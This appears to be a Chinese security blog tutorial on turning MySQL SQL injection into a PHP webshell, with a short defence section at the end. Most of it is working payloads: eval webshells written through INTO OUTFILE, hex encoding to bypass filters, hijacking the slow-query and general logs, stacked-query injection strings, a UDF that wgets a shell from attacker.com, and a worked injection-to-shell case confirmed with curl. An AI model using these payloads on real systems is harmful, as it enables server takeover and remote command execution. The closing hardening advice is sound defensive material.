---
layout: post
title: "SQL注入GetShell技术详解：从原理到实战"
date: 2026-04-10 10:00:00 +0800
categories: [网络安全, Web安全]
tags: [SQL注入, GetShell, 慢查询日志, 文件写入, 渗透测试, Web安全, MySQL]
author: Security Researcher
---

> **免责声明**：本文仅供学习交流使用，请勿用于非法用途。进行安全测试时，请确保已获得目标系统的合法授权。

## 目录
- [前置条件](#前置条件)
- [INTO OUTFILE方法GetShell](#into-outfile方法getshell)
- [慢查询日志GetShell](#慢查询日志getshell)
- [General日志GetShell](#general日志getshell)
- [其他GetShell方法](#其他getshell方法)
- [完整实战案例](#完整实战案例)
- [防御措施](#防御措施)
- [总结](#总结)

---

## 前置条件

要通过SQL注入成功获取WebShell，必须满足以下关键条件：

### 1. 权限要求

| 权限类型 | 说明 |
|---------|------|
| FILE权限 | MySQL用户必须拥有FILE权限才能执行文件读写操作 |
| root权限 | 通常需要数据库管理员权限才能修改日志配置 |
| 写入权限 | 操作系统层面对目标目录有写入权限 |

### 2. secure_file_priv配置

`secure_file_priv`参数是控制MySQL导入导出权限的关键配置：

| 配置值 | 含义 |
|-------|------|
| `NULL` | 禁止所有导入导出操作 |
| `/tmp/` | 仅允许在指定目录下进行导入导出 |
| `''`（空） | 不限制导入导出的目录（最危险） |

**查看当前配置：**

```sql
SHOW GLOBAL VARIABLES LIKE '%secure_file_priv%';
```

**验证FILE权限：**

```sql
-- 尝试读取文件验证权限
SELECT LOAD_FILE('/etc/passwd');
```

### 3. 路径信息

必须知道网站的绝对路径，常用获取方法：

```sql
-- 查看MySQL安装路径
SELECT @@basedir;

-- 查看数据文件路径
SELECT @@datadir;

-- 通过报错信息获取路径
SELECT 'test' INTO OUTFILE '/nonexistent/test.txt';

-- 读取配置文件获取路径
SELECT LOAD_FILE('/var/www/html/config.php');
```

---

## INTO OUTFILE方法GetShell

### 基本原理

SQL查询语句是能够写入文件的，前提是 `secure_file_priv=''`（为空）。同时需要有写入权限，并且数据库中没有这个文件（不支持覆盖文件）。

**核心语法：**

```sql
SELECT 'Hello, World!' INTO OUTFILE '/path/to/file.txt';
```

### 写入木马到网站根目录

#### 方法1：直接写入一句话木马

```sql
-- 基础写入语句
SELECT '<?php @eval($_POST[1]);?>' INTO OUTFILE '/var/www/html/shell.php';

-- 使用UNION SELECT写入
SELECT 1,2,3,4,5,6,7,8 UNION SELECT 1,2,3,"<?php @eval($_POST[1]);?>",5,6,7,8 INTO OUTFILE '/var/www/html/shell.php';
```

#### 方法2：使用十六进制编码绕过引号过滤

```sql
-- 将<?php @eval($_POST[cmd]);?>转为十六进制：0x3c3f70687020406576616c28245f504f53545b636d645d293b3f3e
SELECT 1,2,3,0x3c3f70687020406576616c28245f504f53545b636d645d293b3f3e,5,6,7,8 INTO OUTFILE '/var/www/html/shell.php';
```

#### 方法3：利用字段分隔符写入

```sql
-- 使用FIELDS TERMINATED BY
SELECT * FROM users WHERE id=1 INTO OUTFILE '/var/www/html/shell.php' FIELDS TERMINATED BY '<?php @eval($_POST[1]);?>';

-- 使用LINES TERMINATED BY
SELECT * FROM users WHERE id=1 INTO OUTFILE '/var/www/html/shell.php' LINES TERMINATED BY '<?php @eval($_POST[1]);?>';

-- 使用LINES STARTING BY
SELECT * FROM users WHERE id=1 INTO OUTFILE '/var/www/html/shell.php' LINES STARTING BY '<?php @eval($_POST[1]);?>';
```

### OUTFILE与DUMPFILE的区别

| 特性 | INTO OUTFILE | INTO DUMPFILE |
|------|-------------|---------------|
| 格式处理 | 会添加换行符等格式 | 保持原始数据，无额外格式 |
| 适用场景 | 文本文件 | 二进制文件、UDF提权 |
| 文件内容 | 可能有脏数据 | 纯净数据 |

```sql
-- 使用DUMPFILE写入（适合二进制文件）
SELECT '<?php @eval($_POST[1]);?>' INTO DUMPFILE '/var/www/html/shell.php';
```

### 注意事项

1. **路径分隔符**：Windows下需要使用双反斜杠 `\\`
   ```sql
   SELECT '<?php @eval($_POST[1]);?>' INTO OUTFILE 'C:\\phpStudy\\WWW\\shell.php';
   ```

2. **文件覆盖**：INTO OUTFILE不支持覆盖已有文件

3. **Web目录权限**：确保MySQL进程用户对Web目录有写入权限

---

## 慢查询日志GetShell

### 原理介绍

慢查询日志用于记录执行时间超过指定阈值的SQL语句。攻击者可以通过修改慢查询日志的配置，将日志文件路径设置为Web目录下的PHP文件，然后执行一个超时的SQL语句，将木马代码记录到日志文件中。

### 相关参数

| 参数名 | 说明 |
|-------|------|
| `slow_query_log` | 慢查询日志开关（0=关闭，1=开启） |
| `slow_query_log_file` | 慢查询日志文件路径 |
| `long_query_time` | 慢查询时间阈值（默认10秒） |

### 利用步骤

**步骤1：查看慢查询日志状态**

```sql
SHOW GLOBAL VARIABLES LIKE '%slow%';
```

**步骤2：开启慢查询日志**

```sql
SET GLOBAL slow_query_log = 1;
```

**步骤3：修改日志文件路径到Web目录**

```sql
-- Windows环境（注意双反斜杠）
SET GLOBAL slow_query_log_file = 'C:\\phpStudy\\WWW\\test.php';

-- Linux环境
SET GLOBAL slow_query_log_file = '/var/www/html/shell.php';
```

**步骤4：执行超时查询写入木马**

```sql
-- 使用sleep函数使查询超时（超过10秒）
SELECT '<?php @eval($_POST[1]);?>' OR SLEEP(11);

-- 或者使用benchmark函数
SELECT '<?php @eval($_POST[1]);?>' OR BENCHMARK(10000000,MD5(1));
```

### 完整Payload示例

```sql
-- 查看当前配置
' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT @@slow_query_log), FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) OR '

-- 开启慢查询日志
'; SET GLOBAL slow_query_log = 1; #

-- 设置日志路径
'; SET GLOBAL slow_query_log_file = 'C:\\phpStudy\\WWW\\shell.php'; #

-- 写入木马（超时11秒）
' UNION SELECT '<?php @eval($_POST[1]);?>' OR SLEEP(11); #
```

---

## General日志GetShell

### 原理介绍

General日志（普通查询日志）会记录MySQL服务器接收到的所有SQL语句。与慢查询日志类似，通过开启general_log并修改日志文件路径到Web目录，然后执行包含木马代码的SQL语句，即可将木马写入日志文件。

### 相关参数

| 参数名 | 说明 |
|-------|------|
| `general_log` | 普通查询日志开关 |
| `general_log_file` | 日志文件路径 |
| `log_output` | 日志输出方式（FILE/TABLE） |

### 利用步骤

**步骤1：查看日志配置**

```sql
SHOW VARIABLES LIKE '%general%';
SHOW VARIABLES LIKE 'log_output';
```

**步骤2：开启general日志**

```sql
SET GLOBAL general_log = 'ON';
```

**步骤3：确保日志输出到文件**

```sql
SET GLOBAL log_output = 'FILE';
```

**步骤4：修改日志文件路径**

```sql
-- Windows
SET GLOBAL general_log_file = 'C:/phpStudy/WWW/shell.php';

-- Linux
SET GLOBAL general_log_file = '/var/www/html/shell.php';
```

**步骤5：执行SQL写入木马**

```sql
SELECT '<?php @eval($_POST[1]);?>';
```

### 完整Payload示例

```sql
-- 开启general日志
'; SET GLOBAL general_log = 'ON'; #

-- 设置日志输出为文件
'; SET GLOBAL log_output = 'FILE'; #

-- 修改日志路径到Web目录
'; SET GLOBAL general_log_file = 'C:/phpStudy/WWW/shell.php'; #

-- 写入木马
'; SELECT '<?php @eval($_POST[1]);?>'; #
```

---

## 其他GetShell方法

### 1. 利用Load Data Infile配合Outfile

```sql
-- 创建临时表
'; CREATE TABLE temp_shell (cmd TEXT); #

-- 向表中插入木马
'; INSERT INTO temp_shell VALUES('<?php @eval($_POST[1]);?>'); #

-- 导出到Web目录
'; SELECT cmd FROM temp_shell INTO OUTFILE '/var/www/html/shell.php'; #

-- 删除临时表
'; DROP TABLE temp_shell; #
```

### 2. SQLMap --os-shell

SQLMap的`--os-shell`功能可以自动化获取WebShell：

```bash
# 检查是否为DBA权限
sqlmap -u "http://target.com/page.php?id=1" --is-dba

# 获取os-shell
sqlmap -u "http://target.com/page.php?id=1" --os-shell
```

**使用条件：**
- 拥有DBA权限
- `secure_file_priv`无限制
- 知道网站绝对路径
- GPC为off（PHP魔术引号关闭）

### 3. UDF提权GetShell

通过上传UDF（用户自定义函数）实现命令执行：

```sql
-- 查看插件目录
SHOW VARIABLES LIKE 'plugin_dir';

-- 将UDF文件写入插件目录（需要已编译的UDF文件）
SELECT 0x... INTO DUMPFILE '/usr/lib/mysql/plugin/udf.so';

-- 创建函数
CREATE FUNCTION sys_exec RETURNS STRING SONAME 'udf.so';

-- 执行命令
SELECT sys_exec('wget http://attacker.com/shell.php -O /var/www/html/shell.php');
```

---

## 完整实战案例

### 场景描述

目标网站存在SQL注入漏洞，通过注入点获取WebShell。

### 信息收集

**步骤1：确认注入点**

```
email=admin' #           -- 报错
email=admin' # #         -- 不报错
email=admin' or '1' #    -- 成功登录
```

**步骤2：判断字段数**

```
email=admin' union select 1,2,3,4,5,6,7,8 #      -- 报错
email=admin' union select 1,2,3,4,5,6,7,8,9 #    -- 正常
```

确定字段数为9。

**步骤3：获取数据库信息**

```
email=admin' union select 1,2,3,database(),5,6,7,8,9 #
-- 返回数据库名：test_db

email=admin' union select 1,2,3,user(),5,6,7,8,9 #
-- 返回用户：root@localhost

email=admin' union select 1,2,3,@@version,5,6,7,8,9 #
-- 返回版本：5.7.26
```

**步骤4：验证FILE权限**

```
email=admin' union select 1,2,3,load_file('/etc/passwd'),5,6,7,8,9 #
-- 成功读取文件，证明有FILE权限
```

### GetShell过程

#### 方法一：INTO OUTFILE直接写入

```
email=admin' union select 1,2,3,"<?php @eval($_POST['x']);?>",5,6,7,8,9 into outfile '/var/www/html/shell.php' #
```

#### 方法二：使用十六进制编码

```
email=admin' union select 1,2,3,0x3c3f70687020406576616c28245f504f53545b636d645d293b3f3e,5,6,7,8,9 into outfile '/var/www/html/shell.php' #
```

#### 方法三：慢查询日志GetShell

```
-- 开启慢查询日志
email=admin'; set global slow_query_log=1; #

-- 设置日志路径
email=admin'; set global slow_query_log_file='/var/www/html/shell.php'; #

-- 写入木马
email=admin' union select '<?php @eval($_POST[1]);?>' or sleep(11) #
```

### 验证Shell

```bash
# 使用curl验证
curl http://target.com/shell.php -X POST -d "1=system('whoami');"

# 使用蚁剑/菜刀连接
# URL: http://target.com/shell.php
# 密码: 1
```

---

## 防御措施

### 1. 数据库配置安全

```ini
# my.cnf 或 my.ini
[mysqld]
# 限制文件导入导出
secure_file_priv = /tmp

# 禁用危险函数
local_infile = 0

# 日志安全配置
slow_query_log = 0
general_log = 0
```

### 2. 最小权限原则

```sql
-- 创建应用专用账号，只授予必要权限
CREATE USER 'app_user'@'localhost' IDENTIFIED BY 'strong_password';
GRANT SELECT, INSERT, UPDATE ON database.* TO 'app_user'@'localhost';

-- 明确禁止危险权限
REVOKE FILE ON *.* FROM 'app_user'@'localhost';
REVOKE SUPER ON *.* FROM 'app_user'@'localhost';
REVOKE PROCESS ON *.* FROM 'app_user'@'localhost';
```

### 3. 代码层面防御

```php
<?php
// 使用参数化查询，防止SQL注入
$stmt = $pdo->prepare('SELECT * FROM users WHERE email = ?');
$stmt->execute([$email]);

// 永远不要直接拼接用户输入
// 危险：$sql = "SELECT * FROM users WHERE email = '$email'";
?>
```

### 4. 日志监控

```sql
-- 监控异常日志配置变更
SHOW GLOBAL VARIABLES LIKE '%log%';
SHOW GLOBAL VARIABLES LIKE '%file%';

-- 定期检查Web目录是否出现异常文件
```

### 5. 文件系统权限

- Web目录禁止数据库用户写入
- 使用chroot jail限制MySQL进程
- 定期扫描Web目录中的可疑文件

---

## 总结

SQL注入GetShell是SQL注入漏洞的高级利用方式，主要通过以下几种方法实现：

| 方法 | 适用条件 | 难度 | 成功率 |
|------|---------|------|--------|
| INTO OUTFILE | secure_file_priv为空，有FILE权限 | 低 | 高 |
| 慢查询日志 | 有root权限，可修改配置 | 中 | 高 |
| General日志 | 有root权限，可修改配置 | 中 | 高 |
| SQLMap os-shell | DBA权限，知道路径 | 低 | 中 |
| UDF提权 | 可上传文件到插件目录 | 高 | 中 |

### 防御要点

1. **严格限制数据库权限**：应用账号只授予必要权限，禁止FILE、SUPER等危险权限
2. **配置secure_file_priv**：限制文件导入导出目录
3. **关闭不必要的日志**：生产环境关闭general_log和slow_query_log
4. **使用参数化查询**：从根本上防止SQL注入
5. **文件系统隔离**：数据库用户无法写入Web目录

### 学习资源

- [MySQL官方文档 - 安全](https://dev.mysql.com/doc/refman/8.0/en/security.html)
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [PortSwigger SQL Injection](https://portswigger.net/web-security/sql-injection)
- [狼组安全团队 - SQL注入知识库](https://wiki.wgpsec.org/knowledge/ctf/sql.html)
- [PayloadsAllTheThings - SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

---

*本文仅供学习交流使用，请勿用于非法用途。进行安全测试时，请确保已获得目标系统的合法授权。*

*本文最后更新于：2026年4月10日*
